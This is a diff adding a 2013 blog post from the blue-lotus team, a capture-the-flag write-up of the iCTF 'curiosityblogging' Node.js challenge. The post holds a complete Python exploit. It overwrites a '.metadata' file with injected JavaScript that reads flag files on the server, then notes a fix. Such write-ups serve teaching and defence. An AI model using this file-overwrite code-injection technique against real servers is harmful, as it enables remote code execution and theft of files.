@@ -1,0 +1,279 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>iCTF 2013 curiosityblogging writeup - blue-lotus</title>
+  <meta name="author" content="blue-lotus">
+
+  
+  <meta name="description" content="This is a web blogging system written using nodejs. After some play and test, We find out that, it&#8217;s a blog posting system, people can read &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://www.blue-lotus.net/www/ictf-2013-curiosity-writeup">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="blue-lotus" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">blue-lotus</a></h1>
+  
+    <h2>Security Research Team @ Tsinghua University</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:www.blue-lotus.net/www" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">iCTF 2013 Curiosityblogging Writeup</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-03-24T00:00:00+08:00" pubdate data-updated="true">Mar 24<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>This is a web blogging system written using nodejs.</p>
+
+<p>After some play and test, We find out that, it&#8217;s a blog posting system, people can read posts and upload posts.</p>
+
+<p>Then We carefully read through its core logic code. The code reveals that there is a &#8220;store&#8221; interface for iCTF servers to push flags to the system. And the there is a dir called &#8220;flags&#8221;, so our goal is to hack the web and capture the flags from the &#8220;flags&#8221; directory.</p>
+
+<p>Reviewing the code, we know that, when users create a post, the blogging system will first store its content in a plain text file, then store a metadata file using &#8220;.metadata&#8221; as extended filename. And the metadata file only contains the length of the post surrounded by brackets, such as &#8220;[36]&#8220;.</p>
+
+<p>Soon after that, we noted that, in &#8220;metadata.js&#8221;, it exports a function called checkfile, which do metafile checking by execute the metadata file as javascript in a new context. Haha, it&#8217;s time for us to show our <a href="http://en.wikipedia.org/wiki/Arbitrary_code_execution">RCE</a> skills!</p>
+
+<p>The solution is straightforward now. First we upload a random post to the server, say &#8220;abc&#8221;. At this time, the server will write abc and abc.metadata in the posts dir. Then we can upload a file using abc.metadata as the name, so the real metadata of the abc will be overwritten. The content of the newly uploaded abc.metadata is some javascript code, which will read file content from flags dir and store them in posts dir, say, stored as flag and flag.metadata.</p>
+
+<p>After all of above prepared, we just fire a hit to get post for abc, it will cause the abc.metadata executed, so our javascript code will store the flag in posts dir, then we can visit that post to get the flag.</p>
+
+<p>Here is the complete code for this exploit:</p>
+
+<pre><code>class Exploit():
+
+  def exploit_curiosity_blogging(self, ip, port, flag_id):
+    import httplib, time
+    conn = httplib.HTTPConnection(ip, port)
+    chunk = 'xxx' * 10
+    headers = {}
+    conn.request("POST", "/upload?name=___", chunk, headers)
+    conn.getresponse().read()
+
+    js = "    var fs = require('fs'); var content = fs.readFileSync('flags/" 
+        + flag_id 
+        + "'); fs.writeFileSync('posts/zzz', content); fs.writeFileSync('posts/zzz.metadata', '[' + content.length + ']'); "
+    conn = httplib.HTTPConnection(ip, port)
+    conn.request("POST", "/upload?name=___.metadata", js, headers)
+    conn.getresponse().read()
+
+    conn = httplib.HTTPConnection(ip, port)
+    conn.request("GET", "/read?id=___")
+    response = conn.getresponse()
+    s = response.read()
+
+    conn = httplib.HTTPConnection(ip, port)
+    conn.request("GET", "/read?id=zzz")
+    response = conn.getresponse()
+    s = response.read()
+    index = s.find('&lt;p&gt;')
+    index2 = s.find('&lt;/p&gt;')
+    s = s[index + 3: index2].strip()
+    ary = s.split('\n')
+    if len(ary) &amp;gt; 1:
+      return ary[1]
+    else:
+      return ''
+
+  def execute(self, ip, port, flag_id):
+    self.flag = self.exploit_curiosity_blogging(ip, port, flag_id);
+
+  def result(self):
+    return {'FLAG' : self.flag }
+</code></pre>
+
+<p>Knowing the exploit, it&#8217;s easy now to fix. The best way is to modify the checkfile function in metadata.js to remove the <a href="http://en.wikipedia.org/wiki/Arbitrary_code_execution">RCE</a> problem. Actually we fix this problem by disable uploading of posts end with &#8220;.metadata&#8221;, in this way we only need to modify one line, but may be less secure.</p>
+
+<p>Many thanks to Chao Liu who showed expert level hacking skills working with me, he inspired me with ideas, and helped me write the exploit code.</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">zTrix</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-03-24T00:00:00+08:00" pubdate data-updated="true">Mar 24<span>th</span>, 2013</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/uncategorized/'>Uncategorized</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://www.blue-lotus.net/www/ictf-2013-curiosity-writeup/" data-via="" data-counturl="http://www.blue-lotus.net/www/ictf-2013-curiosity-writeup/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/codegate2013-web500-writeup/" title="Previous Post: Codegate2013 web500 writeup">&laquo; Codegate2013 web500 writeup</a>
+      
+      
+        <a class="basic-alignment right" href="/ictf-2013-traintrain-writeup/" title="Next Post: iCTF 2013 traintrain writeup">iCTF 2013 traintrain writeup &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/asis-ctf-finals-2013-login/">ASIS CTF Finals 2013 Login</a>
+      </li>
+    
+      <li class="post">
+        <a href="/asis-ctf-memdump-writeup/">ASIS CTF Memdump Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/ufo-ctf-2013-reverse-keygenme-writeup/">UFO CTF 2013 Reverse &#8211; KeyGenMe Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/ufoctf2013-web100-flagstore/">UFOCTF2013 Web100 FlagStore</a>
+      </li>
+    
+      <li class="post">
+        <a href="/sigint-2013-crypto300-satisfaction/">SIGINT 2013 Crypto300 Satisfaction</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2013 - blue-lotus -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
